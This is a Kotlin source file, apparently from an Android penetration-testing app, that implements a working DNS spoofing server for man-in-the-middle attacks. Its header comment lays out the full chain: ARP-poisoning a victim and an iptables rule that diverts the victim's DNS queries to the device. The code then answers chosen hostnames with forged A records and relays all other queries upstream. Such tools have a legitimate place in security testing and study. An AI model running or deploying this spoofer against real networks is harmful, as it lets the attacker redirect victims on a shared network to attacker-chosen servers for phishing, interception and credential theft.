package org.csploit.strix.data

import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.csploit.strix.core.Logger
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.net.InetSocketAddress
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Native DNS spoofer.
 *
 * Why not ettercap dns_spoof: ettercap's mitm_arp thread does not start on
 * Android (pthread sync in ec_threads.c deadlocks), and in pure passive mode
 * ettercap does not send anything, so the plugin never replies. Reimplementing
 * the tiny bit of DNS we need is simpler and more reliable than patching
 * ettercap's thread layer.
 *
 * How it integrates with the MITM flow:
 *   1. arpspoof poisons the victim (handled by MitmRunner)
 *   2. `iptables -t nat -I PREROUTING -i wlan0 -p udp --dport 53 \
 *        -j REDIRECT --to-ports <listenPort>`
 *      diverts victim's DNS queries to our server on the device
 *   3. This server answers matching names with the spoofed A record,
 *      and forwards everything else to an upstream resolver
 *
 * Listens on 0.0.0.0:<listenPort> (default 5353 to avoid conflicting with
 * Android's own DNS responders on 53).
 */
@Singleton
class DnsSpoofServer @Inject constructor() {

    companion object {
        // Port 5353 is owned by Android's mdnsd, so we pick a free high port.
        const val DEFAULT_PORT = 15353
        private const val QTYPE_A = 1
        private const val QCLASS_IN = 1
        private const val SPOOF_TTL = 60
        private const val UPSTREAM_TIMEOUT_MS = 3000
    }

    private var scope: CoroutineScope? = null
    private var serverJob: Job? = null
    private var socket: DatagramSocket? = null

    @Volatile
    private var entries: List<DnsEntry> = emptyList()

    data class Stats(
        var spoofed: Int = 0,
        var forwarded: Int = 0,
        var failed: Int = 0,
    )

    val stats = Stats()

    /**
     * Start the server. Callable multiple times — restarts with new entries.
     * onEvent receives short human-readable log lines.
     */
    fun start(
        entries: List<DnsEntry>,
        upstreamDns: String,
        port: Int = DEFAULT_PORT,
        onEvent: (String) -> Unit,
    ) {
        stop()
        this.entries = entries
        stats.spoofed = 0
        stats.forwarded = 0
        stats.failed = 0

        val newScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
        scope = newScope

        serverJob = newScope.launch {
            try {
                val sock = DatagramSocket(InetSocketAddress("0.0.0.0", port))
                sock.soTimeout = 0
                socket = sock
                onEvent("[dns] listening on 0.0.0.0:$port, upstream=$upstreamDns, entries=${entries.size}")

                val buffer = ByteArray(4096)
                while (!Thread.currentThread().isInterrupted && !sock.isClosed) {
                    val request = DatagramPacket(buffer, buffer.size)
                    try {
                        sock.receive(request)
                    } catch (_: Exception) {
                        break
                    }
                    val data = request.data.copyOf(request.length)
                    newScope.launch {
                        handle(sock, request.socketAddress as InetSocketAddress, data, upstreamDns, onEvent)
                    }
                }
            } catch (e: Exception) {
                onEvent("[dns] server error: ${e.message}")
                Logger.error("DnsSpoofServer failed", e)
            } finally {
                onEvent("[dns] stopped")
            }
        }
    }

    fun stop() {
        socket?.runCatching { close() }
        socket = null
        serverJob?.cancel()
        serverJob = null
        scope?.coroutineContext?.get(Job)?.cancel()
        scope = null
    }

    private suspend fun handle(
        sock: DatagramSocket,
        client: InetSocketAddress,
        req: ByteArray,
        upstreamDns: String,
        onEvent: (String) -> Unit,
    ) = withContext(Dispatchers.IO) {
        if (req.size < 12) {
            stats.failed++
            return@withContext
        }
        val qName = try { parseQName(req, 12) } catch (_: Exception) { null }
        val qType = try { readU16(req, qNameEnd(req, 12)) } catch (_: Exception) { 0 }

        val match = qName?.let { name ->
            entries.firstOrNull { it.hostname.equals(name, ignoreCase = true) }
        }

        if (match != null && qType == QTYPE_A) {
            val reply = buildSpoofedReply(req, match.address)
            if (reply != null) {
                sock.send(DatagramPacket(reply, reply.size, client))
                stats.spoofed++
                onEvent("[dns] SPOOF ${qName} → ${match.address}")
                return@withContext
            }
        }

        // Forward
        try {
            DatagramSocket().use { fwd ->
                fwd.soTimeout = UPSTREAM_TIMEOUT_MS
                fwd.send(DatagramPacket(req, req.size, InetAddress.getByName(upstreamDns), 53))
                val buf = ByteArray(4096)
                val reply = DatagramPacket(buf, buf.size)
                fwd.receive(reply)
                val data = reply.data.copyOf(reply.length)
                sock.send(DatagramPacket(data, data.size, client))
                stats.forwarded++
            }
        } catch (e: Exception) {
            stats.failed++
            onEvent("[dns] forward error for ${qName ?: "<parse-fail>"}: ${e.message}")
        }
    }

    /**
     * Parse the QNAME label sequence starting at offset.
     * Format: length-prefixed labels, terminated by 0 byte.
     * Returns the dotted name. No compression support (queries don't use it).
     */
    private fun parseQName(data: ByteArray, offset: Int): String {
        val sb = StringBuilder()
        var i = offset
        while (i < data.size) {
            val len = data[i].toInt() and 0xff
            if (len == 0) break
            if (len and 0xc0 != 0) break // pointer: not in queries, abort
            if (sb.isNotEmpty()) sb.append('.')
            i++
            if (i + len > data.size) throw IllegalStateException("truncated QNAME")
            sb.append(String(data, i, len, Charsets.US_ASCII))
            i += len
        }
        return sb.toString()
    }

    /** Byte offset of the QTYPE (first byte after the QNAME terminator). */
    private fun qNameEnd(data: ByteArray, offset: Int): Int {
        var i = offset
        while (i < data.size) {
            val len = data[i].toInt() and 0xff
            if (len == 0) return i + 1
            if (len and 0xc0 != 0) return i + 2
            i += len + 1
        }
        throw IllegalStateException("QNAME not terminated")
    }

    private fun readU16(data: ByteArray, offset: Int): Int =
        ((data[offset].toInt() and 0xff) shl 8) or (data[offset + 1].toInt() and 0xff)

    /**
     * Build a DNS response:
     *  - copy header, set QR=1, RA=1, rcode=0, ancount=1
     *  - keep the question section
     *  - append one A answer with the spoofed IP
     */
    private fun buildSpoofedReply(req: ByteArray, spoofIp: String): ByteArray? {
        val ip = parseIpv4(spoofIp) ?: return null
        val qEnd = qNameEnd(req, 12) + 4 // QNAME terminator + QTYPE + QCLASS
        if (qEnd > req.size) return null

        val out = ByteArray(qEnd + 16)
        // Copy header + question
        System.arraycopy(req, 0, out, 0, qEnd)

        // Flags: QR=1, Opcode=0, AA=0, TC=0, RD=(keep), RA=1, Z=0, RCODE=0
        val flags = (0x8180).toShort()
        out[2] = (flags.toInt() ushr 8).toByte()
        out[3] = flags.toByte()
        // qdcount=1 (already)
        // ancount=1
        out[6] = 0; out[7] = 1
        // nscount=0, arcount=0
        out[8] = 0; out[9] = 0
        out[10] = 0; out[11] = 0

        // Answer: name=c00c (pointer to offset 12), type=A, class=IN, ttl, rdlen=4, ip
        var p = qEnd
        out[p++] = 0xc0.toByte(); out[p++] = 0x0c
        out[p++] = 0; out[p++] = QTYPE_A.toByte()
        out[p++] = 0; out[p++] = QCLASS_IN.toByte()
        out[p++] = (SPOOF_TTL ushr 24).toByte()
        out[p++] = (SPOOF_TTL ushr 16).toByte()
        out[p++] = (SPOOF_TTL ushr 8).toByte()
        out[p++] = SPOOF_TTL.toByte()
        out[p++] = 0; out[p++] = 4
        out[p++] = ip[0]; out[p++] = ip[1]; out[p++] = ip[2]; out[p++] = ip[3]
        return out.copyOf(p)
    }

    private fun parseIpv4(s: String): ByteArray? {
        val parts = s.split(".")
        if (parts.size != 4) return null
        val out = ByteArray(4)
        for (i in 0 until 4) {
            val v = parts[i].toIntOrNull() ?: return null
            if (v !in 0..255) return null
            out[i] = v.toByte()
        }
        return out
    }
}
